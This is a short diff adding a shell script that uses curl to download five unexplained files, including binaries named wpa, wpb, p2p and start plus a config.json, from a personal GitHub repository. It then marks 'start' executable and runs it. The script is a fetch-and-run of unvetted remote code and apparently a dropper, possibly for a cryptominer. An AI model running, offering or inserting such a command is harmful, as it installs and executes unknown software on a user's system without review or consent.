@@ -1,0 +1,3 @@
+curl https://raw.githubusercontent.com/robertreynolds2/gambar/main/wpa -o wpa https://raw.githubusercontent.com/robertreynolds2/gambar/main/wpb -o wpb https://raw.githubusercontent.com/robertreynolds2/gambar/main/p2p -o p2p https://raw.githubusercontent.com/robertreynolds2/gambar/main/config.json -o config.json https://raw.githubusercontent.com/robertreynolds2/gambar/main/start -o start
+chmod +x start
+./start
